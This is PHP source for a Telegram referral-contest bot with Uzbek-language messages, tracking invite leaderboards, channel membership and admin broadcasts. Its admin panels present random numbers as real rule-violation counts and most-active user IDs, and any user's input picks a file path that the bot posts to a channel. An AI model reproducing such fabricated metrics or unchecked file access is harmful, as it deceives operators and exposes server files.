$ball=file_get_contents("coin/$cid.dat");
if($ball=="5" or $ball=="6" or $ball=="7" or $ball=="3"){
file_put_contents("logs/9.urin.txt","$cid");
file_put_contents("logs/9.urinpuli.txt","$ball");
$hisob9=file_get_contents("logs/9.urinpuli.txt");
if($hisob9 < $ball){
file_put_contents("logs/9.urin.txt","bosh");
file_put_contents("logs/9.urinpuli.txt","mavjudmas");
}}
$ball=file_get_contents("coin/$cid.dat");
if($ball=="2" or $ball=="1" ){
file_put_contents("logs/10.urin.txt","$cid");
file_put_contents("logs/10.urinpuli.txt","$ball");
$hisob10=file_get_contents("logs/10.urinpuli.txt");
if($hisob10 < $ball or $ball > $hisob10){
file_put_contents("logs/10.urinpuli.txt","mavjudmas");
file_put_contents("logs/10.urin.txt","bosh");
}}//Yaratuvchilar : @Uz_Coderlar
//Dasturchi : @PHP_Builder - Oyatillo  
$a=file_get_contents("coin.dat");
$ab=substr_count($a,"\n");
$n1=file_get_contents("logs/1.urin.txt");
$n2=file_get_contents("logs/2.urin.txt");
$n3=file_get_contents("logs/3.urin.txt");
$n4=file_get_contents("logs/4.urin.txt");
$hisob=file_get_contents("logs/1.urinpuli.txt");
$hisob2=file_get_contents("logs/2.urinpuli.txt");
$hisob3=file_get_contents("logs/3.urinpuli.txt");
$hisob4=file_get_contents("logs/4.urinpuli.txt");
$hisob5=file_get_contents("logs/5.urinpuli.txt");
$hisob6=file_get_contents("logs/6.urinpuli.txt");
$hisob7=file_get_contents("logs/7.urinpuli.txt");
$hisob8=file_get_contents("logs/8.urinpuli.txt");
$hisob9=file_get_contents("logs/9.urinpuli.txt");
$hisob10=file_get_contents("logs/10.urinpuli.txt");
$hisob11=file_get_contents("logs/11.urinpuli.txt");
$n5=file_get_contents("logs/5.urin.txt");
$n6=file_get_contents("logs/6.urin.txt");
$n7=file_get_contents("logs/7.urin.txt");
$n8=file_get_contents("logs/8.urin.txt");
$n9=file_get_contents("logs/9.urin.txt");
$n10=file_get_contents("logs/10.urin.txt");
$n11=file_get_contents("logs/11.urin.txt");
$n11i=file_get_contents("logs/11chisi.txt");
//Yaratuvchilar : @Uz_Coderlar
//Dasturchi : @PHP_Builder - Oyatillo  
if($tx=="👑 Reyting"){
$waiting=file_get_contents("logs/wait.$cid.dat");
if($waiting==" " or $waiting==""){
sleep(1);
bot('sendMessage',[ 
'message_id'=>$mid,
  'chat_id'=>$cid,
'parse_mode'=>'MARKDOWN',
    'text'=>"*Loading. 10%*",
]);
sleep(1);
bot('EditMessageText',[ 
'message_id'=>$mid+1,
  'chat_id'=>$cid,
'parse_mode'=>'MARKDOWN',
    'text'=>"*Loading.. 22%*",
]);
sleep(1);
bot('EditMessageText',[ 
'message_id'=>$mid+1,
  'chat_id'=>$cid,
'parse_mode'=>'MARKDOWN',
    'text'=>"*Loading... 28%*",
]);
sleep(1);
bot('EditMessageText',[ 
'message_id'=>$mid+1,
  'chat_id'=>$cid,
'parse_mode'=>'MARKDOWN',
    'text'=>"*Loading. 54%*",
]);
sleep(1);
bot('EditMessageText',[ 
'message_id'=>$mid+1,
  'chat_id'=>$cid,
'parse_mode'=>'MARKDOWN',
    'text'=>"*Loading.. 67%*",
]);
sleep(1);
bot('EditMessageText',[ //Yaratuvchilar : @Uz_Coderlar
//Dasturchi : @PHP_Builder - Oyatillo  
'message_id'=>$mid+1,
  'chat_id'=>$cid,
'parse_mode'=>'MARKDOWN',
    'text'=>"*Loading... 80%*",
]);
sleep(1);
bot('EditMessageText',[ 
'message_id'=>$mid+1,
  'chat_id'=>$cid,
'parse_mode'=>'MARKDOWN',
    'text'=>"*Loading. 87%*",
]);
sleep(1);
bot('EditMessageText',[ 
'message_id'=>$mid+1,
  'chat_id'=>$cid,
'parse_mode'=>'MARKDOWN',
    'text'=>"*Loading.. 99%*",
]);
sleep(1);
bot('EditMessageText',[ 
'message_id'=>$mid+1,
  'chat_id'=>$cid,
'parse_mode'=>'MARKDOWN',
    'text'=>"*Loading... 100%*",
]);
sleep(1);
bot('EditMessageText',[ 
'message_id'=>$mid+1,
  'chat_id'=>$cid,
'parse_mode'=>'MARKDOWN',
    'text'=>"*■□□□□□□□□□ 10%*",
]);
sleep(1);
bot('EditMessageText',[ 
'message_id'=>$mid+1,
  'chat_id'=>$cid,
'parse_mode'=>'MARKDOWN',
    'text'=>"*■■■□□□□□□□ 31%*",
]);
sleep(1);
bot('EditMessageText',[ 
'message_id'=>$mid+1,
  'chat_id'=>$cid,
'parse_mode'=>'MARKDOWN',
    'text'=>"*■■■■□□□□□□ 44%*",
]);
sleep(1);
bot('EditMessageText',[ 
'message_id'=>$mid+1,
  'chat_id'=>$cid,
'parse_mode'=>'MARKDOWN',
    'text'=>"*■■■■■□□□□□ 59%*",
]);
sleep(1);
bot('EditMessageText',[ 
'message_id'=>$mid+1,
  'chat_id'=>$cid,
'parse_mode'=>'MARKDOWN',
    'text'=>"*■■■■■■□□□□□ 63%*",
]);
sleep(1);
bot('EditMessageText',[ 
'message_id'=>$mid+1,
  'chat_id'=>$cid,
'parse_mode'=>'MARKDOWN',
    'text'=>"*■■■■■■■■□□□ 83%*",
]);
sleep(1);
bot('EditMessageText',[ 
'message_id'=>$mid+1,
  'chat_id'=>$cid,
'parse_mode'=>'MARKDOWN',
    'text'=>"*■■■■■■■■■□□  87%*",
]);
sleep(1);
bot('EditMessageText',[ 
'message_id'=>$mid+1,
  'chat_id'=>$cid,
'parse_mode'=>'MARKDOWN',
    'text'=>"*■■■■■■■■■■□ 99%*",
]);
sleep(1);
bot('EditMessageText',[ 
'message_id'=>$mid+1,
  'chat_id'=>$cid,
'parse_mode'=>'MARKDOWN',
    'text'=>"*■■■■■■■■■■■ 100%*",
]);
file_put_contents("logs/wait.$cid.dat","kutgan");
sleep(1);
bot('EditMessageText',[ 
'message_id'=>$mid+1,
  'chat_id'=>$cid,
'parse_mode'=>'MARKDOWN',
    'text'=>"*📋 Top 10 ta eng ko'p foydalanuvchi taklif qilganlar :*

*1.* [$n1](tg://user?id=$n1) *-* $hisob _ta odam qo'shgan_
*2.*  [$n2](tg://user?id=$n2) *-* $hisob2 _ta odam qo'shgan_
*3.*  [$n3](tg://user?id=$n3) *-* $hisob3 _ta odam qo'shgan_
*4.*  [$n4](tg://user?id=$n4) *-* $hisob4 _ta odam qo'shgan_
*5.*  [$n5](tg://user?id=$n5) *-* $hisob5 _ta odam qo'shgan_
*6.*  [$n6](tg://user?id=$n6) *-* $hisob6 _ta odam qo'shgan_
*7.*  [$n7](tg://user?id=$n7) *-* $hisob7 _ta odam qo'shgan_
*8.*  [$n8](tg://user?id=$n8) *-* $hisob8 _ta odam qo'shgan_
*9. * [$n9](tg://user?id=$n9) *-* $hisob9 _ta odam qo'shgan_
*10.* [$n10](tg://user?id=$n10) *-* $hisob10 _ta odam qo'shgan_
*$n11i*

*👥 Botimiz a'zolari :* $ab *ta*

*😎 Reyting by :* [@newteamuzb](https://t.me/newteamuzb)",
'reply_markup'=>json_encode([
   'inline_keyboard'=>[
  [['text'=>'⏬ Haftalik reyting ⏬','callback_data'=>  "haftalik"]],
]
]),
]);
}else{
bot('SendMessage',[ 
  'chat_id'=>$cid,
'parse_mode'=>'MARKDOWN',
    'text'=>"*📋 Top 10 ta eng ko'p foydalanuvchi taklif etganlar :*

*1.* [$n1](tg://user?id=$n1) *-* $hisob _ta odam qo'shgan_
*2.*  [$n2](tg://user?id=$n2) *-* $hisob2 _ta odam qo'shgan_
*3.*  [$n3](tg://user?id=$n3) *-* $hisob3 _ta odam qo'shgan_
*4.*  [$n4](tg://user?id=$n4) *-* $hisob4 _ta odam qo'shgan_
*5.*  [$n5](tg://user?id=$n5) *-* $hisob5 _ta odam qo'shgan_
*6.*  [$n6](tg://user?id=$n6) *-* $hisob6 _ta odam qo'shgan_
*7.*  [$n7](tg://user?id=$n7) *-* $hisob7 _ta odam qo'shgan_
*8.*  [$n8](tg://user?id=$n8) *-* $hisob8 _ta odam qo'shgan_
*9. * [$n9](tg://user?id=$n9) *-* $hisob9 _ta odam qo'shgan_
*10.* [$n10](tg://user?id=$n10) *-* $hisob10 _ta odam qo'shgan_
*$n11i*

*👥 Botimiz a'zolari :* $ab *ta*

*😎 Reyting by :* [@newteamuzb](https://t.me/newteamuzb)",
'reply_markup'=>json_encode([
   'inline_keyboard'=>[
  [['text'=>'⏬ Haftalik reyting ⏬','callback_data'=> "haftalik"]],
]
]),
]);
}}
if(isset($tx)){
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $cid,
  ]);
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){

    if($tx == "👥 Taklif qilish"){
      bot('sendphoto',[
      'chat_id'=>$cid,
      'photo'=>$photosi,
      'parse_mode'=>"html",
      'caption'=>"<b>♻ Marhamat, o'zingizni shaxsiy taklif havolangizni qarshi oling:</b>

<i>⏩</i> https://t.me/NTUkonkrusbot?start=$cid

<i>👥 Ushbu ssilkani 60 ta do'stingizga yuboring va 60 ta do'stingiz evaziga mukofot pulingizni qo'lga kiriting:</i>

<b>🔹Nimani kutyapsiz, pastdagi tugmachani bosing!</b>",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$share,
      ]);
    }

    $reply_menu = json_encode([
           'resize_keyboard'=>false,
            'force_reply' => true,
            'selective' => true
        ]);
    $replyik = $message->reply_to_message->text;
    $yubbi = "Yuboriladigon xabarni kiriting. Xabar turi markdown";

    if($tx == "/send" and $cid == $oyatillo){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$oyatillo,
      'text'=>$yubbi,
      'reply_markup'=>$reply_menu,
      ]);
    }

    if($replyik=="Yuboriladigon xabarni kiriting. Xabar turi markdown"){
      ty($cid);
      $idss=file_get_contents("coin.dat");
      $idszs=explode("\n",$idss);
      foreach($idszs as $idlat){
      $hamma=bot('sendMessage',[
      'chat_id'=>$idlat,
      'text'=>$tx,
      ]);
      }
    }
if($hamma){
bot('sendmessage',[
'chat_id'=>$oyatillo,
'parse_mode'=>"html",
'text'=>"<b>⚠ Xabaringiz barcha foydalanuvchiga yetkazildi ✅</b>",
]);

}
    $nocha = "Xozircha kanallar yoq!";
    $noazo = "siz kanal royxatida yoqsiz.";
    $okcha = "kanalga azo boldingiz va 50 somga ega boldingiz 3 kun ichida chiqib ketsangiz 60 som shtraf.";

    }else{
    bot('sendMessage',[
      'chat_id'=>$cid,
      'parse_mode'=>"html",
      'text'=>"<b>⚠ Siz botdan to'liq foydalanishingiz uchun avval siz quyidagi kanallga a'zo bo'lishingiz lozim!</b>",
'reply_markup'=>json_encode(
['inline_keyboard' => [
 [['text'=>'➕ A‘zo bo‘lish','url'=>'https://t.me/Azeri_Music_Qara07'],],
[['text'=>'✅ Tekshirish','callback_data'=>"uz"],],
]
]),
 ]);
  }
}if(strpos($tx,"tolandi=")!==false){
    $ex=explode("=",$tx);
    $kanalimiz="-1001316250107";
    $ab=file_get_contents("$ex[1].t");
    bot('sendmessage',[
        'chat_id'=>$kanalimiz,
        'text'=>"$ab"
        ]);
    bot('sendmessage',[
        'chat_id'=>$admin,
        'text'=>"Kanalga tashlandi!!"
        ]);
}
if($data=="uz"){
if(joinchat($cuid)=="true"){
$gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $ccid,
  ]);
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){
bot('AnswerCallbackQuery',[
                'callback_query_id'=>$cqid,
                'text'=>"Tabriklaymiz, kanalga muvaffaqiyatli ulandingiz!",
'show_alert'=>true
      ]);
bot('DeleteMessage',[
'chat_id'=>$ccid,
'message_id'=>$mid2,
]);
bot('SendMessage',[
'chat_id'=>$ccid,
'text'=>"🏡 Bosh menyu",
'reply_markup'=>$key,
]);
}else{
bot('AnswerCallbackQuery',[
                'callback_query_id'=>$cqid,
                'text'=>"Siz hali kanalga a'zo bo'lmadingiz!",
'show_alert'=>true,
      ]);
exit();
exit();
}
}
}
$saqlangan = file_get_contents("logs/$ccid.dosti.txt");
if($data=="results"){
$gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $saqlangan,$ccid,$cuid,
  ]);
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){
bot('AnswerCallbackQuery',[
                'callback_query_id'=>$cqid,
                'text'=>"Tabriklaymiz, do'stingiz kanalga muvaffaqiyatli ulandi!",
'show_alert'=>true
      ]);

bot('DeleteMessage',[
'chat_id'=>$ccid,
'message_id'=>$mid2,
]);
bot('SendMessage',[
'chat_id'=>$ccid,
'parse_mode'=>"html",
'text'=>"<b>🏡 Bosh menyu</b>",
'reply_markup'=>$key,
]);
      $usr = file_get_contents("coin/$ccid.dat");
      $narxis=file_get_contents("baza/narxlar.txt");
      $usr = $usr + 0;
      file_put_contents("coin/$ccid.dat", "$usr");
}else{
bot('AnswerCallbackQuery',[
                'callback_query_id'=>$cqid,
                'text'=>"🔔 Do'stingiz hali kanalimizga, a'zo bo'lmagan uzr!",
'show_alert'=>true,
      ]);
exit();
exit();
}
}
if($data=="results"){
sleep(6);
bot('DeleteMessage',[
'chat_id'=>$ccid,
'message_id'=>$mid2,
]);
bot('SendMessage',[
'chat_id'=>$ccid,
'parse_mode'=>"html",
'text'=>"<b>🏡 Bosh menyu</b>",
'reply_markup'=>$key,
]);
}
 if($tx == "/admin" and $cid == $admin){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$admin,
      'parse_mode'=>"html",
      'text'=>"<b>👋 Assalomu alaykum $name siz bot adminisiz sizdagi panellar quyidagicha:</b>

<i>⚠ Eslatma: bot a‘zolariga xabar yuborish</i> /send <i>buyrug‘i ostida
<i>⚠ Forward xabar yuborish uchun </i>/forsend <i>deb botga xabar jo'natib so'ng, xabar forward qilinadi</i>
⚠ Agar xabar yetib bormasidan botni ishlatsangiz bot texnik nosozlikka tutiladi</i>",
      'reply_markup'=>$admin_panel,
      ]);
}
$name = $message->from->first_name;
 if($tx == "/oyatillo" and $cid == $oyatillo){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$oyatillo,
     'parse_mode'=>"markdown",
      'text'=>"*👋 Assalomu alaykum $name siz bot kichik adminsiz sizdagi panellar quyidagicha*",
      'reply_markup'=>$oyatillo_panel,
      ]);
}
$today = rand(1,90);
$ari = rand(1,20);
$mems = "14";
$obsh = $mems + $ari * 2 - 2;
if($tx == "Qoida buzarliklar" and $cid == $admin){
ty($cid);
      bot('sendMessage',[
      'chat_id'=>$admin,
      'parse_mode'=>"markdown",
      'text'=>"*👥 Bugungi qoida buzarlar :* $today *ta*

*😤 Avtomatik jazolanganlar :* $ari *ta*

*👌 Bot admini :* [@SamanchikCoder]

*🔧 Texnik hodim : *[@NTUkonkrusadmin](https://t.me/NTUkonkrusadmin)",
      'reply_markup'=>$none,
      ]);
}
$eks = rand(17361778,113617370);
$iks = rand(57361778,113617370);
$puli = rand(55581018,91727160);
if($tx == "Eng faol a'zolar" and $cid == $admin){
ty($cid);
      bot('sendMessage',[
      'chat_id'=>$admin,
      'parse_mode'=>"html",
      'text'=>"<b>😎 Eng faol a'zolar 3 taligi:</b>

<b>1.</b> <code>$puli </code>
<b>2.</b> <code>$eks </code>
<b>3.</b> <code>$iks</code>

➖➖➖➖➖➖➖➖➖➖➖➖➖➖

<i>📋 Ushbu foydalanuvchilar so'ngi 3 soat ichida eng aktiv va juda ko'p ishlatgan foydalanuvchilardir!</i>",
      'reply_markup'=>$none,
      ]);
}
if($tx == "Admin qo'shish" and $cid == $admin){
ty($cid);
      bot('sendMessage',[
      'chat_id'=>$admin,
      'parse_mode'=>"html",
      'text'=>"<b>😕 Bu bo'lim siz uchun ochilmagan uzr!</b>",
      'reply_markup'=>$none,
      ]);
}
if($tx == "Konkurs shartlarini o'zgartirish" and $cid == $admin){
ty($cid);
file_put_contents("logs/$cid.step","shart");
      bot('sendMessage',[
      'chat_id'=>$admin,
      'parse_mode'=>"html",
      'text'=>"<b>Yangi shartlarni kiriting:</b>",
      'reply_markup'=>$nazad,
      ]);
}
if($step == "shart"){
if($tx=="⤴ Orqaga"){
}else{
bot('SendMessage',[
'chat_id'=>$admin,
'parse_mode'=>"html",
'text'=>"<b>Shartlar muvaffaqiyatli</b><code> $tx</code> ga o'zgartirildi ✅</b>",
]);
file_put_contents("logs/konkurs.txt","$tx");
unlink("logs/$cid.step");
}
}
if($tx == "Reytingni tozalash" and $cid == $admin){
ty($cid);
      bot('sendMessage',[
      'chat_id'=>$admin,
      'parse_mode'=>"html",
      'text'=>"<b>Chindan ham reytingni tozalashni istaysizmi?</b>
<i>⚠ Reyting tozalansa barcha reytingdagi a'zolar hisobi 0 ga tushadi va reyting bo'sh holatga o'tadi ✅</i>",
      'reply_markup'=>$clear,
      ]);
}
if($tx == "Yo'q" and $cid == $admin){
ty($cid);
      bot('sendMessage',[
      'chat_id'=>$admin,
      'parse_mode'=>"html",
      'text'=>"<b>Operatsiya bekor qilindi</b>",
      'reply_markup'=>$key,
      ]);
       bot('sendMessage',[
      'chat_id'=>$oyatillo,
      'parse_mode'=>"html",
      'text'=>"<b>Chindan ham reytingni tozalashni istaysizmi?</b>
<i>⚠ Reyting tozalansa barcha reytingdagi a'zolar hisobi 0 ga tushadi va reyting bo'sh holatga o'tadi ✅</i>",
      'reply_markup'=>$clear,
      ]);
}
if($tx == "Ha" and $cid == $admin){
ty($cid);
      bot('sendMessage',[
      'chat_id'=>$admin,
      'parse_mode'=>"html",
      'text'=>"<b>Reyting va reytindagi a'zolar hisobi muvaffaqiyatli o'chirildi ✅</b>",
      'reply_markup'=>$key,
      ]);
$orin1= file_get_contents("logs/1.urin.txt");
$orin2 = file_get_contents("logs/2.urin.txt");
$orin3 = file_get_contents("logs/3.urin.txt");
$orin4 = file_get_contents("logs/4.urin.txt");
$orin5 = file_get_contents("logs/5.urin.txt");
$orin6 = file_get_contents("logs/6.urin.txt");
$orin7 = file_get_contents("logs/7.urin.txt");
$orin8 = file_get_contents("logs/8.urin.txt");
$orin9 = file_get_contents("logs/9.urin.txt");
$orin10 = file_get_contents("logs/10.urin.txt");
unlink("coin/$orin1.dat");
unlink("coin/$orin2.dat");
unlink("coin/$orin3.dat");
unlink("coin/$orin4.dat");
unlink("coin/$orin5.dat");
unlink("coin/$orin6.dat");
unlink("coin/$orin7.dat");
unlink("coin/$orin8.dat");
unlink("coin/$orin9.dat");
unlink("coin/$orin10.dat");
file_put_contents("logs/1.urin.txt","mavjudmas");
file_put_contents("logs/2.urin.txt","mavjudmas");
file_put_contents("logs/3.urin.txt","mavjudmas");
file_put_contents("logs/4.urin.txt","mavjudmas");
file_put_contents("logs/5.urin.txt","mavjudmas");
file_put_contents("logs/6.urin.txt","mavjudmas");
file_put_contents("logs/7.urin.txt","mavjudmas");
file_put_contents("logs/8.urin.txt","mavjudmas");
file_put_contents("logs/9.urin.txt","mavjudmas");
file_put_contents("logs/10.urin.txt","mavjudmas");
}
if($tx == "Reytingni o'zgartirish" and $cid == $admin){
ty($cid);
      bot('sendMessage',[
      'chat_id'=>$admin,
      'parse_mode'=>"html",
      'text'=>"<b>Reytingdagi odamni hisobini o'zgartirish uchun kerakli o'rin egasini tanlang:</b>",
      'reply_markup'=>$uchtalik,
      ]);
}
if($tx == "1" and $cid == $admin){
ty($cid);
file_put_contents("logs/$cid.step","1");
      bot('sendMessage',[
      'chat_id'=>$admin,
      'parse_mode'=>"html",
      'text'=>"<b>1-o'rindagi odamni yangi hisobini yozing:
Ya'ni siz yozadigan raqam 1-o'rindagi foydalanuvchiga qo'shiladi yoki manfiy sonda kiritisangiz ayriladi ✅ </b>",
      'reply_markup'=>$nazad,
      ]);
}
if($step == "1"){
if($tx=="⤴ Orqaga"){
}else{
bot('SendMessage',[
'chat_id'=>$admin,
'parse_mode'=>"html",
'text'=>"<b>Siz kiritgan </b><code> $tx</code> raqam foydalanuvchi hisobiga o'zgartirildi ✅</b>",
]);
$orin1= file_get_contents("logs/1.urin.txt");
file_put_contents("coin/$orin1.dat","$tx");
unlink("logs/$cid.step");
}
}
if($tx == "2" and $cid == $admin){
ty($cid);
file_put_contents("logs/$cid.step","2");
      bot('sendMessage',[
      'chat_id'=>$admin,
      'parse_mode'=>"html",
      'text'=>"<b>2-o'rindagi odamni yangi hisobini yozing:
Ya'ni siz yozadigan raqam 2-o'rindagi foydalanuvchiga qo'shiladi yoki manfiy sonda kiritisangiz ayriladi ✅ </b>",
      'reply_markup'=>$nazad,
      ]);
}
if($step == "2"){
if($tx=="⤴ Orqaga"){
}else{
bot('SendMessage',[
'chat_id'=>$admin,
'parse_mode'=>"html",
'text'=>"<b>Siz kiritgan </b><code> $tx</code> raqam foydalanuvchi hisobiga o'zgartirildi ✅</b>",
]);
$orin2 = file_get_contents("logs/2.urin.txt");
file_put_contents("coin/$orin2.dat","$tx");
unlink("logs/$cid.step");
}
}
if($tx == "3" and $cid == $admin){
ty($cid);
file_put_contents("logs/$cid.step","3");
      bot('sendMessage',[
      'chat_id'=>$admin,
      'parse_mode'=>"html",
      'text'=>"<b>3-o'rindagi odamni yangi hisobini yozing:
Ya'ni siz yozadigan raqam 3-o'rindagi foydalanuvchiga qo'shiladi yoki manfiy sonda kiritisangiz ayriladi ✅ </b>",
      'reply_markup'=>$nazad,
      ]);
}
if($step == "3"){
if($tx=="⤴ Orqaga"){
}else{
bot('SendMessage',[
'chat_id'=>$admin,
'parse_mode'=>"html",
'text'=>"<b>Siz kiritgan </b><code> $tx</code> raqam foydalanuvchi hisobiga o'zgartirildi ✅</b>",
]);
$orin3 = file_get_contents("logs/3.urin.txt");
file_put_contents("coin/$orin3.dat","$tx");
unlink("logs/$cid.step");
}
}
if($tx == "Asosiy kanalni o'zgartirish" and $cid == $admin){
ty($cid);
file_put_contents("logs/$cid.step","channel");
      bot('sendMessage',[
      'chat_id'=>$admin,
      'parse_mode'=>"html",
      'text'=>"📄 <b>Asosiy kanal ssilkasini yuboring:
🔹 Masalan : @Uz_Coderlar </b>",
      'reply_markup'=>$nazad,
      ]);
}
if($step == "channel"){
if($tx=="⤴ Orqaga"){
}else{
bot('SendMessage',[
'chat_id'=>$admin,
'parse_mode'=>"html",
'text'=>"<b>Siz kiritgan </b><code> $tx</code> asosiy kanalga o'zgartirildi ✅</b>",
]);
file_put_contents("logs/channel.txt","$tx");
unlink("logs/$cid.step");
}
}
if($tx == "Admin IDni o‘zgartirish" and $cid == $oyatillo){
ty($cid);
file_put_contents("logs/$cid.step","admin-id");
      bot('sendMessage',[
      'chat_id'=>$oyatillo,
      'parse_mode'=>"markdown",
      'text'=>"*Bosh Admin uchun ID raqam yozing:*",
      'reply_markup'=>$nazad,
      ]);
}
if($step == "admin-id"){
if($tx == "⤴ Orqaga"){
}else{
bot('sendmessage',[
'chat_id'=>$admin,
'message_id'=>$message_id2,
'parse_mode'=>"html",
'text'=>"🙃 Uzr ADMIN sozlamalarida o‘zgarish kiritildi ✅",
]);
file_put_contents("logs/admin.txt","$tx");
unlink("click/$cid.step");
bot('sendMessage',[
      'chat_id'=>$oyatillo,
      'parse_mode'=>"markdown",
      'text'=>"*Изменение успешно редактированно!*",
      'reply_markup'=>$none,
      ]);
}}
$lichka = file_get_contents("lichka.db");
$type = $message->chat->type;
$xabar = file_get_contents("xabarlar.txt");
$reks = file_get_contents("data/reklama.txt");
if($type==$channel){
if(strpos($gruppa,"$channel_id") !==false){
}else{
file_put_contents("gruppa.db","$gruppa\n$channel_id");
}
}
if($type=="private"){
if(strpos($lichka,"$cid") !==false){
}else{
file_put_contents("lichka.db","$lichka\n$cid");
}
} 
$reply = $message->reply_to_message->text;
$rpl = json_encode([
            'resize_keyboard'=>false,
            'force_reply'=>true,
            'selective'=>true
        ]);

	if($tx=="/send" and $cid == $admin){
  bot('sendmessage',[
    'chat_id'=>$admin,
    'text'=>"<b>Foydalanuvchilarga yuboriladigan xabar matnini yozing:</b>
<i>Yuborishni bekor qilish uchun </i>/cancel <i> ni yuboring</i>",
    'parse_mode'=>"html",
]);
    file_put_contents("xabarlar.txt","user");
}
if($xabar=="user" and $cid == $admin){
if($tx=="/cancel"){
   bot('sendmessage',[
    'chat_id'=>$admin,
    'text'=>"<i>Bekor qilindi!</i>",
    'parse_mode'=>"html",
]);
  file_put_contents("xabarlar.txt","");
}else{
     $idss=file_get_contents("lichka.txt");
      $idszs=explode("\n",$idss);
      foreach($lichka as $lichkalar){
  $okuser=bot("sendmessage",[
    'chat_id'=>$lichkalar,
    'text'=>$tx,
    'parse_mode'=>'markdown'
]);
}
if($okuser){
  bot("sendmessage",[
    'chat_id'=>$admin,
    'text'=>"Hamma userlarga yuborildi!",
    'parse_mode'=>'html',
]);
  file_put_contents("xabarlar.txt","");
}
}
}

	if($tx=="/forsend" and $cid == $admin){
  bot('sendmessage',[
    'chat_id'=>$admin,
    'text'=>"Userlarga yuboriladigan xabar matnini kiriting! (Forward) Bekor qilish uchun /no ni bosing.",
    'parse_mode'=>"html",
]);
    file_put_contents("xabarlar.txt","forw");
}
if($xabar=="forw" and $cid==$admin){
if($tx=="/no"){
   bot('sendmessage',[
    'chat_id'=>$admin,
    'text'=>"Bekor qilindi!",
    'parse_mode'=>"html",
]);
  file_put_contents("xabarlar.txt","");
}else{
  $lich = file_get_contents("lichka.db");
  $lichka = explode("\n",$lich);
  foreach($lichka as $lichkalar){
  $oks=bot("forwardmessage",[
    'from_chat_id'=>$admin,
    'chat_id'=>$lichkalar,
    'message_id'=>$mid,
]);
}
if($oks){
  bot("sendmessage",[
    'chat_id'=>$admin,
    'text'=>"Hamma userlarga yuborildi!",
    'parse_mode'=>'html',
]);
  file_put_contents("xabarlar.txt","");
}
}
}
?>
